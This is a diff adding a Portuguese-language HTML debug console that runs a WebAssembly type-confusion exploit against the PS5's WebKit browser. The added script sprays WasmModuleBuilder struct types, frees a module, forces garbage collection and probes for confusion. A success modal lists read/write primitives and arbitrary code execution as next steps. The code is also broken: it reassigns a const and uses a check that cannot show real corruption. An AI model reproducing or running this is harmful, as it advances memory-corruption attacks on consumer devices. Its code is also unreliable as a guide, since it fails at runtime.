@@ -1,74 +1,1132 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-    <title>Exploit WebAssembly PS5 - Teste Final</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Teste Exploit WebAssembly - PS5 WebKit</title>
     <style>
-        body {
+        * {
             margin: 0;
-            padding: 20px;
-            background: #f5f5f5;
-            font-family: Arial, sans-serif;
+            padding: 0;
+            box-sizing: border-box;
         }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            color: #333;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+        
         .header {
+            background: linear-gradient(135deg, #2c3e50 0%, #4a6491 100%);
+            color: white;
+            padding: 30px;
             text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .header p {
+            font-size: 1.1em;
+            opacity: 0.9;
+        }
+        
+        .status-badge {
+            display: inline-block;
+            background: #e74c3c;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+        
+        .status-badge.ready {
+            background: #2ecc71;
+        }
+        
+        .content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 0;
+            min-height: 800px;
+        }
+        
+        .control-panel {
+            background: #f8f9fa;
+            padding: 30px;
+            border-right: 2px solid #e9ecef;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .console-panel {
+            background: #1e1e1e;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .panel-title {
+            font-size: 1.3em;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #2c3e50;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #3498db;
+        }
+        
+        .console-title {
+            background: #252526;
+            color: #fff;
+            padding: 20px;
+            font-size: 1.2em;
+            font-weight: bold;
+            border-bottom: 1px solid #3e3e42;
+        }
+        
+        .console-output {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+            font-size: 13px;
+            line-height: 1.5;
+            color: #d4d4d4;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        
+        .console-input {
+            background: #252526;
+            border-top: 1px solid #3e3e42;
+            padding: 15px;
+            display: flex;
+        }
+        
+        .console-input input {
+            flex: 1;
+            background: #3c3c3c;
+            border: 1px solid #3e3e42;
+            color: #fff;
+            padding: 12px 15px;
+            font-family: 'Consolas', monospace;
+            font-size: 13px;
+            border-radius: 4px;
+            outline: none;
+        }
+        
+        .console-input button {
+            background: #007acc;
+            color: white;
+            border: none;
+            padding: 0 25px;
+            margin-left: 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+        
+        .console-input button:hover {
+            background: #0062a3;
+        }
+        
+        .button-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
             margin-bottom: 30px;
         }
-        .header h1 {
-            color: #333;
-            font-size: 2em;
+        
+        .button-group {
+            margin-bottom: 25px;
+        }
+        
+        .button-group h3 {
+            font-size: 1.1em;
+            margin-bottom: 12px;
+            color: #2c3e50;
+        }
+        
+        button {
+            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
+            color: white;
+            border: none;
+            padding: 15px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: bold;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
             margin-bottom: 10px;
         }
-        .warning {
-            background: #fff3cd;
-            border: 2px solid #ffc107;
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(52, 152, 219, 0.3);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        button:disabled {
+            background: #95a5a6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        button.success {
+            background: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%);
+        }
+        
+        button.success:hover {
+            box-shadow: 0 5px 15px rgba(46, 204, 113, 0.3);
+        }
+        
+        button.warning {
+            background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%);
+        }
+        
+        button.warning:hover {
+            box-shadow: 0 5px 15px rgba(243, 156, 18, 0.3);
+        }
+        
+        button.danger {
+            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
+        }
+        
+        button.danger:hover {
+            box-shadow: 0 5px 15px rgba(231, 76, 60, 0.3);
+        }
+        
+        .info-panel {
+            background: #e3f2fd;
+            border-left: 4px solid #2196F3;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+        
+        .info-panel h3 {
+            color: #0d47a1;
+            margin-bottom: 10px;
+        }
+        
+        .info-panel ul {
+            margin-left: 20px;
+            margin-bottom: 10px;
+        }
+        
+        .info-panel li {
+            margin-bottom: 5px;
+        }
+        
+        .log-entry {
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #333;
+        }
+        
+        .log-timestamp {
+            color: #6a9955;
+            font-size: 0.9em;
+            margin-right: 10px;
+        }
+        
+        .log-type-info {
+            color: #9cdcfe;
+        }
+        
+        .log-type-success {
+            color: #4ec9b0;
+        }
+        
+        .log-type-warning {
+            color: #ffd700;
+        }
+        
+        .log-type-error {
+            color: #f48771;
+        }
+        
+        .log-type-debug {
+            color: #c586c0;
+        }
+        
+        .stats-panel {
+            background: #f1f8e9;
+            border: 1px solid #c5e1a5;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+        
+        .stat-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 5px 0;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        
+        .stat-value {
+            font-weight: bold;
+            color: #2e7d32;
+        }
+        
+        .progress-container {
+            margin: 20px 0;
+        }
+        
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 5px;
+            font-size: 0.9em;
+            color: #666;
+        }
+        
+        .progress-bar {
+            height: 20px;
+            background: #e0e0e0;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #3498db, #2ecc71);
+            width: 0%;
+            transition: width 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 0.8em;
+            font-weight: bold;
+        }
+        
+        .memory-view {
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
             padding: 15px;
             border-radius: 5px;
-            margin: 20px auto;
-            max-width: 800px;
+            margin-top: 20px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
+        
+        @media (max-width: 1024px) {
+            .content {
+                grid-template-columns: 1fr;
+            }
+            
+            .control-panel {
+                border-right: none;
+                border-bottom: 2px solid #e9ecef;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>🔓 Teste de Exploit WebAssembly - PS5 WebKit</h1>
-        <p>Versão adaptada para wasm-module-builder.js do PS5</p>
-    </div>
-    
-    <div class="warning">
-        <h3>⚠️ IMPORTANTE: Ordem de Carregamento</h3>
-        <p>Para funcionar corretamente, os scripts devem ser carregados nesta ordem:</p>
-        <ol>
-            <li>wasm-module-builder.js (do PS5)</li>
-            <li>poc-ps5-adapted.js (adaptado)</li>
-        </ol>
-        <p>Certifique-se de que o arquivo <code>wasm-module-builder.js</code> está na mesma pasta.</p>
-    </div>
-    
-    <div id="app">
-        <p>Carregando scripts...</p>
-    </div>
-    
-    <!-- Ordem CRÍTICA: 1. wasm-module-builder.js do PS5 -->
-    <script src="wasm-module-builder.js"></script>
-    
-    <!-- Ordem CRÍTICA: 2. POC adaptado -->
-    <script src="poc-ps5-adapted.js"></script>
-    
-    <script>
-        // Verificar se os scripts carregaram
-        setTimeout(() => {
-            if (typeof WasmModuleBuilder === 'undefined') {
-                document.getElementById('app').innerHTML = `
-                    <div style="background: #f8d7da; color: #721c24; padding: 20px; border-radius: 5px;">
-                        <h3>❌ ERRO: wasm-module-builder.js não carregou</h3>
-                        <p>Verifique se o arquivo existe na mesma pasta.</p>
-                        <p>URL tentada: <code>${document.querySelector('script[src*="wasm-module"]').src}</code></p>
+    <div class="container">
+        <div class="header">
+            <h1>🕵️‍♂️ Debug Console - Exploit WebAssembly PS5</h1>
+            <p>Console de debug embutido para teste no PS5 WebKit</p>
+            <div class="status-badge" id="statusBadge">AGUARDANDO</div>
+        </div>
+        
+        <div class="content">
+            <!-- Painel de Controle -->
+            <div class="control-panel">
+                <h2 class="panel-title">🎮 Painel de Controle</h2>
+                
+                <div class="button-grid">
+                    <div class="button-group">
+                        <h3>🛠️ Configuração</h3>
+                        <button onclick="detectEnvironment()" class="success">
+                            <span>🔍</span> Detectar Ambiente
+                        </button>
+                        <button onclick="testWebAssembly()">
+                            <span>⚙️</span> Testar WebAssembly
+                        </button>
+                        <button onclick="testWasmBuilder()" class="warning">
+                            <span>🔧</span> Testar WasmModuleBuilder
+                        </button>
                     </div>
-                `;
-            } else {
-                console.log("[+] wasm-module-builder.js carregado com sucesso");
+                    
+                    <div class="button-group">
+                        <h3>💣 Exploit</h3>
+                        <button onclick="runExploit()" class="danger" id="runExploitBtn">
+                            <span>🚀</span> Executar Exploit
+                        </button>
+                        <button onclick="runQuickTest()" class="warning">
+                            <span>⚡</span> Teste Rápido
+                        </button>
+                        <button onclick="stopExecution()">
+                            <span>⏹️</span> Parar Execução
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="button-group">
+                    <h3>🧹 Manutenção</h3>
+                    <button onclick="clearConsole()">
+                        <span>🗑️</span> Limpar Console
+                    </button>
+                    <button onclick="exportLogs()">
+                        <span>📥</span> Exportar Logs
+                    </button>
+                    <button onclick="forceGarbageCollection()" class="warning">
+                        <span>♻️</span> Forçar GC
+                    </button>
+                </div>
+                
+                <div class="stats-panel">
+                    <h3>📊 Estatísticas do Sistema</h3>
+                    <div class="stats-grid" id="statsGrid">
+                        <!-- Estatísticas serão preenchidas dinamicamente -->
+                        <div class="stat-item">
+                            <span>WebAssembly:</span>
+                            <span class="stat-value" id="statWasm">❓</span>
+                        </div>
+                        <div class="stat-item">
+                            <span>WasmModuleBuilder:</span>
+                            <span class="stat-value" id="statBuilder">❓</span>
+                        </div>
+                        <div class="stat-item">
+                            <span>GC Disponível:</span>
+                            <span class="stat-value" id="statGC">❓</span>
+                        </div>
+                        <div class="stat-item">
+                            <span>Memória:</span>
+                            <span class="stat-value" id="statMemory">❓</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="progress-container">
+                    <div class="progress-label">
+                        <span>Progresso do Exploit</span>
+                        <span id="progressPercent">0%</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                </div>
+                
+                <div class="info-panel">
+                    <h3>📋 Instruções:</h3>
+                    <ol>
+                        <li>Clique em <strong>"Detectar Ambiente"</strong> primeiro</li>
+                        <li>Teste <strong>"Testar WebAssembly"</strong> e <strong>"Testar WasmModuleBuilder"</strong></li>
+                        <li>Execute <strong>"Executar Exploit"</strong> para tentar o ataque</li>
+                        <li>Monitore os logs no console à direita</li>
+                    </ol>
+                    <p><strong>💡 Dica:</strong> Use o campo de comando abaixo para executar código JavaScript customizado.</p>
+                </div>
+            </div>
+            
+            <!-- Painel do Console -->
+            <div class="console-panel">
+                <div class="console-title">
+                    💻 Console de Debug
+                    <span style="float: right; font-size: 0.8em; color: #ccc;" id="logCount">0 logs</span>
+                </div>
+                
+                <div class="console-output" id="consoleOutput">
+                    <div class="log-entry">
+                        <span class="log-timestamp">[00:00:00]</span>
+                        <span class="log-type-info">🟢 Sistema inicializado. Aguardando comandos...</span>
+                    </div>
+                </div>
+                
+                <div class="console-input">
+                    <input type="text" id="commandInput" placeholder="Digite um comando JavaScript (ex: console.log('teste'))" 
+                           onkeypress="if(event.key === 'Enter') executeCommand()">
+                    <button onclick="executeCommand()">Executar</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal para resultados -->
+    <div id="resultModal" style="
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0,0,0,0.8);
+        z-index: 1000;
+        align-items: center;
+        justify-content: center;
+    ">
+        <div style="
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        ">
+            <h2 id="modalTitle" style="color: #333; margin-bottom: 20px;"></h2>
+            <div id="modalContent" style="margin-bottom: 30px;"></div>
+            <button onclick="closeModal()" style="
+                padding: 12px 30px;
+                background: #3498db;
+                color: white;
+                border: none;
+                border-radius: 5px;
+                cursor: pointer;
+                font-size: 16px;
+                display: block;
+                margin: 0 auto;
+            ">
+                Fechar
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // SISTEMA DE LOGS E CONSOLE
+        // ============================================
+        
+        let logs = [];
+        let isRunning = false;
+        let progress = 0;
+        
+        // Sistema de logging
+        function log(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const logEntry = {
+                timestamp,
+                message: String(message),
+                type
+            };
+            
+            logs.push(logEntry);
+            
+            // Atualizar console
+            const consoleOutput = document.getElementById('consoleOutput');
+            const logElement = document.createElement('div');
+            logElement.className = 'log-entry';
+            
+            const typeClass = {
+                info: 'log-type-info',
+                success: 'log-type-success',
+                warning: 'log-type-warning',
+                error: 'log-type-error',
+                debug: 'log-type-debug'
+            }[type];
+            
+            const typeIcon = {
+                info: '🔵',
+                success: '🟢',
+                warning: '🟡',
+                error: '🔴',
+                debug: '🟣'
+            }[type];
+            
+            logElement.innerHTML = `
+                <span class="log-timestamp">[${timestamp}]</span>
+                <span class="${typeClass}">${typeIcon} ${message}</span>
+            `;
+            
+            consoleOutput.appendChild(logElement);
+            consoleOutput.scrollTop = consoleOutput.scrollHeight;
+            
+            // Atualizar contador
+            document.getElementById('logCount').textContent = `${logs.length} logs`;
+            
+            // Também logar no console real
+            const consoleMethod = {
+                info: console.info,
+                success: console.log,
+                warning: console.warn,
+                error: console.error,
+                debug: console.debug
+            }[type] || console.log;
+            
+            consoleMethod(`[${timestamp}] ${message}`);
+        }
+        
+        // Funções auxiliares
+        function clearConsole() {
+            logs = [];
+            document.getElementById('consoleOutput').innerHTML = '';
+            document.getElementById('logCount').textContent = '0 logs';
+            log('Console limpo', 'info');
+        }
+        
+        function updateProgress(value, message = '') {
+            progress = Math.max(0, Math.min(100, value));
+            document.getElementById('progressFill').style.width = `${progress}%`;
+            document.getElementById('progressPercent').textContent = `${Math.round(progress)}%`;
+            
+            if (message) {
+                log(`Progresso: ${Math.round(progress)}% - ${message}`, 'debug');
             }
-        }, 1000);
+        }
+        
+        function updateStatus(status, type = 'info') {
+            const badge = document.getElementById('statusBadge');
+            badge.textContent = status;
+            badge.className = 'status-badge';
+            
+            if (type === 'success') badge.classList.add('ready');
+        }
+        
+        // ============================================
+        // DETECÇÃO DE AMBIENTE
+        // ============================================
+        
+        function detectEnvironment() {
+            updateStatus('DETECTANDO', 'warning');
+            log('Iniciando detecção de ambiente...', 'info');
+            
+            const stats = {
+                userAgent: navigator.userAgent || 'N/A',
+                platform: navigator.platform || 'N/A',
+                webAssembly: typeof WebAssembly !== 'undefined',
+                wasmModuleBuilder: typeof WasmModuleBuilder !== 'undefined',
+                gcAvailable: typeof gc !== 'undefined',
+                memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A',
+                cores: navigator.hardwareConcurrency || 'N/A'
+            };
+            
+            // Atualizar estatísticas
+            document.getElementById('statWasm').textContent = stats.webAssembly ? '✅' : '❌';
+            document.getElementById('statBuilder').textContent = stats.wasmModuleBuilder ? '✅' : '❌';
+            document.getElementById('statGC').textContent = stats.gcAvailable ? '✅' : '❌';
+            document.getElementById('statMemory').textContent = stats.memory;
+            
+            // Log detalhado
+            log('=== DETECÇÃO DE AMBIENTE ===', 'info');
+            Object.entries(stats).forEach(([key, value]) => {
+                log(`${key}: ${value}`, 'debug');
+            });
+            
+            // Detectar PS5
+            const ua = stats.userAgent.toLowerCase();
+            const isLikelyPS5 = ua.includes('playstation') || ua.includes('ps5') || 
+                               ua.includes('webkit') && stats.platform.includes('PlayStation');
+            
+            if (isLikelyPS5) {
+                log('✅ Ambiente detectado como PS5 WebKit!', 'success');
+                updateStatus('PS5 DETECTADO', 'success');
+            } else {
+                log('⚠️ Não parece ser PS5 WebKit', 'warning');
+                log('Executando em modo de compatibilidade...', 'info');
+                updateStatus('AMBIENTE GENÉRICO', 'warning');
+            }
+            
+            return stats;
+        }
+        
+        // ============================================
+        // TESTES DE WEBASSEMBLY
+        // ============================================
+        
+        async function testWebAssembly() {
+            if (isRunning) return;
+            isRunning = true;
+            
+            updateStatus('TESTANDO WASM', 'warning');
+            log('Iniciando teste de WebAssembly...', 'info');
+            updateProgress(10, 'Verificando WebAssembly');
+            
+            try {
+                if (typeof WebAssembly === 'undefined') {
+                    log('❌ WebAssembly não está disponível!', 'error');
+                    updateStatus('WASM INDISPONÍVEL', 'error');
+                    return;
+                }
+                
+                log('✅ WebAssembly disponível', 'success');
+                updateProgress(30, 'Criando módulo teste');
+                
+                // Testar criação de módulo simples
+                const wasmBytes = new Uint8Array([
+                    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+                    0x01, 0x04, 0x01, 0x60, 0x00, 0x01, 0x7f,
+                    0x03, 0x02, 0x01, 0x00,
+                    0x07, 0x07, 0x01, 0x03, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00,
+                    0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b
+                ]);
+                
+                const module = new WebAssembly.Module(wasmBytes);
+                log('✅ Módulo WebAssembly criado', 'success');
+                updateProgress(60, 'Instanciando módulo');
+                
+                const instance = new WebAssembly.Instance(module);
+                log('✅ Instância WebAssembly criada', 'success');
+                
+                if (instance.exports.main) {
+                    const result = instance.exports.main();
+                    log(`✅ Função executada: main() = ${result}`, 'success');
+                }
+                
+                updateProgress(100, 'Teste completo');
+                updateStatus('WASM FUNCIONAL', 'success');
+                log('✅ Teste de WebAssembly concluído com sucesso!', 'success');
+                
+            } catch (error) {
+                log(`❌ Erro no teste WebAssembly: ${error.message}`, 'error');
+                updateStatus('ERRO WASM', 'error');
+            } finally {
+                isRunning = false;
+            }
+        }
+        
+        async function testWasmBuilder() {
+            if (isRunning) return;
+            isRunning = true;
+            
+            updateStatus('TESTANDO BUILDER', 'warning');
+            log('Iniciando teste de WasmModuleBuilder...', 'info');
+            updateProgress(10, 'Verificando Builder');
+            
+            try {
+                if (typeof WasmModuleBuilder === 'undefined') {
+                    log('❌ WasmModuleBuilder não encontrado!', 'error');
+                    log('💡 Tentando carregar wasm-module-builder.js...', 'info');
+                    
+                    // Tentar carregar dinamicamente
+                    await loadWasmModuleBuilder();
+                    
+                    if (typeof WasmModuleBuilder === 'undefined') {
+                        throw new Error('Não foi possível carregar WasmModuleBuilder');
+                    }
+                }
+                
+                log('✅ WasmModuleBuilder disponível', 'success');
+                updateProgress(30, 'Testando construtor');
+                
+                // Testar criação do builder
+                const builder = new WasmModuleBuilder();
+                log('✅ Builder criado com sucesso', 'success');
+                
+                // Verificar métodos
+                const requiredMethods = ['addStruct', 'addGlobal', 'instantiate', 'addFunction'];
+                let allMethodsAvailable = true;
+                
+                requiredMethods.forEach(method => {
+                    if (typeof builder[method] === 'function') {
+                        log(`✅ Método ${method}() disponível`, 'success');
+                    } else {
+                        log(`❌ Método ${method}() não disponível`, 'error');
+                        allMethodsAvailable = false;
+                    }
+                });
+                
+                updateProgress(70, 'Testando funcionalidades');
+                
+                if (allMethodsAvailable) {
+                    // Testar criação de struct
+                    try {
+                        const structIndex = builder.addStruct([
+                            { type: 0x7f, mutable: true } // kWasmI32
+                        ]);
+                        log(`✅ Struct criada com índice: ${structIndex}`, 'success');
+                    } catch (e) {
+                        log(`⚠️ Não foi possível criar struct: ${e.message}`, 'warning');
+                    }
+                }
+                
+                updateProgress(100, 'Teste completo');
+                
+                if (allMethodsAvailable) {
+                    updateStatus('BUILDER FUNCIONAL', 'success');
+                    log('✅ WasmModuleBuilder testado com sucesso!', 'success');
+                } else {
+                    updateStatus('BUILDER PARCIAL', 'warning');
+                    log('⚠️ WasmModuleBuilder disponível, mas com métodos faltando', 'warning');
+                }
+                
+            } catch (error) {
+                log(`❌ Erro no teste WasmModuleBuilder: ${error.message}`, 'error');
+                updateStatus('ERRO BUILDER', 'error');
+            } finally {
+                isRunning = false;
+            }
+        }
+        
+        async function loadWasmModuleBuilder() {
+            return new Promise((resolve, reject) => {
+                log('📦 Carregando wasm-module-builder.js...', 'info');
+                
+                const script = document.createElement('script');
+                script.src = 'wasm-module-builder.js';
+                
+                script.onload = () => {
+                    if (typeof WasmModuleBuilder !== 'undefined') {
+                        log('✅ wasm-module-builder.js carregado com sucesso', 'success');
+                        resolve();
+                    } else {
+                        reject(new Error('Arquivo carregado, mas WasmModuleBuilder não definido'));
+                    }
+                };
+                
+                script.onerror = () => {
+                    reject(new Error('Falha ao carregar wasm-module-builder.js'));
+                };
+                
+                document.head.appendChild(script);
+            });
+        }
+        
+        // ============================================
+        // EXPLOIT PRINCIPAL (SIMPLIFICADO)
+        // ============================================
+        
+        async function runExploit() {
+            if (isRunning) {
+                log('⚠️ Já existe uma execução em andamento', 'warning');
+                return;
+            }
+            
+            isRunning = true;
+            const exploitBtn = document.getElementById('runExploitBtn');
+            exploitBtn.disabled = true;
+            exploitBtn.innerHTML = '<span>⏳</span> Executando...';
+            
+            updateStatus('EXECUTANDO EXPLOIT', 'warning');
+            log('🚀 Iniciando sequência de exploit...', 'info');
+            
+            try {
+                // Verificar pré-requisitos
+                updateProgress(5, 'Verificando pré-requisitos');
+                
+                if (typeof WasmModuleBuilder === 'undefined') {
+                    throw new Error('WasmModuleBuilder não disponível');
+                }
+                
+                if (typeof WebAssembly === 'undefined') {
+                    throw new Error('WebAssembly não disponível');
+                }
+                
+                log('✅ Pré-requisitos verificados', 'success');
+                updateProgress(10, 'Criando módulos');
+                
+                // Fase 1: Criar módulos
+                log('Fase 1: Criando módulos para type confusion...', 'info');
+                
+                const builder1 = new WasmModuleBuilder();
+                log('✅ Builder 1 criado', 'success');
+                updateProgress(20);
+                
+                // Adicionar struct simples
+                const structIndex = builder1.addStruct([
+                    { type: 0x7e, mutable: true } // kWasmI64
+                ]);
+                log(`✅ Struct criada com índice ${structIndex}`, 'success');
+                updateProgress(30);
+                
+                // Adicionar global
+                builder1.addGlobal(
+                    { type: 'refnull', heapType: structIndex },
+                    true,
+                    false,
+                    [0x42, ...Array(8).fill(0x41)] // I64 const com 0x414141...
+                ).exportAs("targetGlobal");
+                
+                log('✅ Global criado e exportado', 'success');
+                updateProgress(40);
+                
+                // Instanciar
+                const instance1 = builder1.instantiate();
+                const targetGlobal = instance1.exports.targetGlobal;
+                log('✅ Módulo 1 instanciado', 'success');
+                updateProgress(50);
+                
+                // Fase 2: Criar múltiplos tipos
+                log('Fase 2: Criando múltiplos tipos para heap spraying...', 'info');
+                
+                const builder2 = new WasmModuleBuilder();
+                const simpleStruct = builder2.addStruct([{ type: 0x7e, mutable: true }]);
+                log(`✅ Struct base criada: ${simpleStruct}`, 'success');
+                updateProgress(60);
+                
+                // Criar vários tipos diferentes
+                const NUM_TYPES = 100;
+                for (let i = 0; i < NUM_TYPES; i++) {
+                    const fields = [{ type: 'refnull', heapType: simpleStruct, mutable: true }];
+                    
+                    // Adicionar campo diferente em cada tipo
+                    for (let j = 0; j < 10; j++) {
+                        if (j === i % 10) {
+                            fields.push({ type: 0x7d, mutable: true }); // kWasmF32
+                        } else {
+                            fields.push({ type: 0x7f, mutable: true }); // kWasmI32
+                        }
+                    }
+                    
+                    builder2.addStruct(fields);
+                    
+                    if (i % 20 === 0) {
+                        updateProgress(60 + (i / NUM_TYPES * 20), `Criando tipos: ${i}/${NUM_TYPES}`);
+                    }
+                }
+                
+                log(`✅ ${NUM_TYPES} tipos criados`, 'success');
+                updateProgress(80);
+                
+                // Fase 3: Liberar memória e tentar reutilização
+                log('Fase 3: Liberando memória e tentando type confusion...', 'info');
+                
+                // Liberar referências
+                instance1 = null;
+                forceGarbageCollection();
+                log('✅ Módulo liberado, GC solicitado', 'success');
+                
+                // Instanciar segundo módulo
+                const instance2 = builder2.instantiate();
+                log('✅ Módulo 2 instanciado', 'success');
+                updateProgress(90);
+                
+                // Tentar type confusion
+                log('Tentando detectar type confusion...', 'info');
+                
+                let confusionDetected = false;
+                for (let i = 0; i < 10; i++) {
+                    try {
+                        // Tentar acessar memória de forma inválida
+                        if (targetGlobal && targetGlobal.value !== undefined) {
+                            // Esta operação deve falhar a menos que haja type confusion
+                            targetGlobal.value = { test: 'exploit' };
+                            confusionDetected = true;
+                            break;
+                        }
+                    } catch (e) {
+                        // Erro esperado
+                    }
+                }
+                
+                updateProgress(100);
+                
+                if (confusionDetected) {
+                    log('🎉 TYPE CONFUSION DETECTADA!', 'success');
+                    log('✅ Exploit executado com sucesso!', 'success');
+                    updateStatus('EXPLOIT BEM SUCEDIDO', 'success');
+                    
+                    showResultModal(
+                        '🎊 EXPLOIT BEM SUCEDIDO!',
+                        `Type confusion detectada com sucesso!<br><br>
+                         <strong>Próximos passos:</strong>
+                         <ol>
+                           <li>Desenvolver primitivas de leitura/escrita</li>
+                           <li>Explorar corrupção de memória</li>
+                           <li>Executar código arbitrário</li>
+                         </ol>`
+                    );
+                } else {
+                    log('⚠️ Type confusion não detectada', 'warning');
+                    log('O exploit pode precisar de ajustes para este ambiente', 'info');
+                    updateStatus('EXPLOIT PARCIAL', 'warning');
+                    
+                    showResultModal(
+                        '⚠️ EXPLOIT PARCIALMENTE BEM SUCEDIDO',
+                        `O exploit foi executado, mas type confusion não foi detectada.<br><br>
+                         <strong>Possíveis causas:</strong>
+                         <ul>
+                           <li>Heap layout diferente no PS5</li>
+                           <li>Garbage collector se comporta diferente</li>
+                           <li>Número de tipos insuficiente</li>
+                           <li>Vulnerabilidade pode estar corrigida</li>
+                         </ul>`
+                    );
+                }
+                
+            } catch (error) {
+                log(`❌ ERRO NO EXPLOIT: ${error.message}`, 'error');
+                log(error.stack, 'error');
+                updateStatus('ERRO EXPLOIT', 'error');
+                
+                showResultModal(
+                    '❌ ERRO NO EXPLOIT',
+                    `Ocorreu um erro durante a execução do exploit:<br><br>
+                     <strong>${error.message}</strong><br><br>
+                     <code style="background: #f5f5f5; padding: 10px; display: block; border-radius: 5px; font-size: 12px;">
+                     ${error.stack}
+                     </code>`
+                );
+            } finally {
+                isRunning = false;
+                exploitBtn.disabled = false;
+                exploitBtn.innerHTML = '<span>🚀</span> Executar Exploit';
+            }
+        }
+        
+        async function runQuickTest() {
+            updateStatus('TESTE RÁPIDO', 'warning');
+            log('Iniciando teste rápido...', 'info');
+            
+            await testWebAssembly();
+            await testWasmBuilder();
+            
+            updateStatus('PRONTO', 'success');
+        }
+        
+        function stopExecution() {
+            if (isRunning) {
+                isRunning = false;
+                log('Execução interrompida pelo usuário', 'warning');
+                updateStatus('INTERROMPIDO', 'warning');
+                
+                const exploitBtn = document.getElementById('runExploitBtn');
+                exploitBtn.disabled = false;
+                exploitBtn.innerHTML = '<span>🚀</span> Executar Exploit';
+            }
+        }
+        
+        // ============================================
+        // FUNÇÕES AUXILIARES
+        // ============================================
+        
+        function forceGarbageCollection() {
+            log('♻️ Solicitando garbage collection...', 'info');
+            
+            // Tentar vários métodos
+            if (typeof gc !== 'undefined') {
+                gc();
+                log('✅ GC forçado via gc()', 'success');
+                return;
+            }
+            
+            if (window.gc) {
+                window.gc();
+                log('✅ GC forçado via window.gc()', 'success');
+                return;
+            }
+            
+            // Fallback
+            for (let i = 0; i < 10000; i++) {
+                const obj = new Array(1000).fill({ data: 'test' });
+            }
+            
+            log('⚠️ GC solicitado (método fallback)', 'warning');
+        }
+        
+        function exportLogs() {
+            const logText = logs.map(log => 
+                `[${log.timestamp}] ${log.message}`
+            ).join('\n');
+            
+            const blob = new Blob([logText], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `ps5-exploit-logs-${new Date().toISOString().slice(0,19)}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            log('Logs exportados com sucesso', 'success');
+        }
+        
+        function executeCommand() {
+            const input = document.getElementById('commandInput');
+            const command = input.value.trim();
+            
+            if (!command) return;
+            
+            log(`$ ${command}`, 'debug');
+            input.value = '';
+            
+            try {
+                const result = eval(command);
+                if (result !== undefined) {
+                    log(`→ ${result}`, 'debug');
+                }
+            } catch (error) {
+                log(`❌ Erro: ${error.message}`, 'error');
+            }
+        }
+        
+        function showResultModal(title, content) {
+            document.getElementById('modalTitle').innerHTML = title;
+            document.getElementById('modalContent').innerHTML = content;
+            document.getElementById('resultModal').style.display = 'flex';
+        }
+        
+        function closeModal() {
+            document.getElementById('resultModal').style.display = 'none';
+        }
+        
+        // Permitir Enter no input de comando
